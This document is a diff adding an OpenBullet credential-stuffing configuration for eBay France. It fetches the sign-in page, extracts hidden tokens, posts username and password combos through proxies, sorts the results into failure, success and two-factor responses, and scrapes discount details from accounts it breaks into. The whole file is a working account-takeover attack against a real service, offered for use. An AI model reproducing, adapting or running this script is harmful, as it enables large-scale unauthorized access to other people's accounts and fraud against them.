@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "ebay",
+  "SuggestedBots": 50,
+  "LastModified": "2019-05-01T05:22:20.2662567+02:00",
+  "AdditionalInfo": "",
+  "Author": "Shaidow",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://signin.ebay.fr/ws/eBayISAPI.dll?SellItem" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"srt\" value=\"" "\"><" -> VAR "srt" 
+PARSE "<SOURCE>" LR "\"mid\":\"" "\",\"" -> VAR "mid" 
+REQUEST POST "https://www.ebay.fr/signin/s" 
+  CONTENT "i1=&pageType=-1&srt=<srt>&tagInfo=ht5%253DAQAAAWoZJLj4AAU0NjI2ODlkMjE2YTBhYWQ5NWI4MjA4N2NmZmY4YzcwOAAAC%25252FTRrswOc%25252F%25252BDFGcCrBEA9jFu3%25252Bw*%257Cht5new%253Dtrue%2526usid%253D70ed171e16a0ac8063c2a408ffebd412&mid=<mid>&usid=70ed171e16a0ac8063c2a408ffebd412&htmid=&fypReset=&ICurl=&src=&AppName=&srcAppId=&errmsg=&rtmData=PS%3DT.0&rqid=70ed172016a0ac8063ce288affffffff&lkdhjebhsjdhejdshdjchquwekguid=70ed172016a0ac8063ce288affffffff&userid=<USER>&pass=<PASS>&kmsi-unchecked=1&kmsi=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 771" 
+  HEADER "origin: https://signin.ebay.fr" 
+  HEADER "referer: https://signin.ebay.fr/ws/eBayISAPI.dll?SellItem" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Les informations saisies ne correspondent pas." 
+  KEYCHAIN Success OR 
+    KEY "Mon eBay" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "Vérification en deux temps" 
+REQUEST GET "https://www.ebay.fr/myb/Summary" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "\">\n\t\t\t\t\t\t\t\t" " de réduction sur votre achat." -> CAP "Réduction:" 
